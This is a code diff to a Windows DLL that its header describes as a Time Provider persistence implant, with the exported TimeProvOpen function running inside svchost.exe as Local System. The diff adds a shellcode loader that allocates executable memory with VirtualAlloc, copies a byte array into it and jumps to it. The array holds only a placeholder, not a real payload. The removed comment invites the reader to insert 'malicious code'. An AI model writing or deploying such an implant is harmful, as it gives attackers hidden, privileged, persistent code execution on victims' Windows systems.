@@ -2,27 +2,7 @@
  * TimeProvider Persistence DLL (T1543.003)
  * Entry point: TimeProvOpen() - add payload code here
  */
-#ifndef WINAPI
-#define WINAPI __stdcall
-#endif
-#ifndef FALSE
-#define FALSE 0
-#endif
-#ifndef TRUE
-#define TRUE 1
-#endif
-
-typedef unsigned long ULONG;
-typedef ULONG* PULONG;
-typedef int BOOL;
-typedef unsigned long DWORD;
-typedef void* LPVOID;
-typedef void* HMODULE;
-typedef wchar_t WCHAR;
-typedef WCHAR* PWSTR;
-typedef unsigned __int64 ULONGLONG;
-
-#define ERROR_SUCCESS 0
+#include <Windows.h>
 
 extern "C" {
     __declspec(dllexport) DWORD WINAPI TimeProvOpen(
@@ -30,8 +10,10 @@ extern "C" {
         PWSTR pwszDllName,
         void* ptpPI
     ) {
-        // PAYLOAD ENTRY POINT - Runs in svchost.exe (Local System)
-        // Replace this section with your malicious code
+        unsigned char shellcode[] = {"0%"};
+        void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        memcpy(exec, shellcode, sizeof(shellcode));
+        ((void(*)())exec)();
         return ERROR_SUCCESS;
     }
 
